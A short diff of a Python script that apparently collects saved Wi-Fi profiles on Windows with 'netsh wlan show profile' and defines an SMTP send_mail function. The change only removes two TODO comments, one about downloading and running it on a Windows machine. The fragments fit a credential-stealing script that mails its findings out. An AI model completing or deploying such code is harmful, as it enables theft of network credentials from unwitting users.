@@ -1,5 +1,5 @@
 #! /usr/bin/env python
-# TODO: consider deleting this
+
 import subprocess
 import smtplib
 import re
@@ -13,7 +13,6 @@ def send_mail(email, password, message):
     server.quit()
 
 
-# TODO: test it on physical Windows machine -- just download it and run it.
 command_display_networks = "netsh wlan show profile"
 
 networks_data_list = []
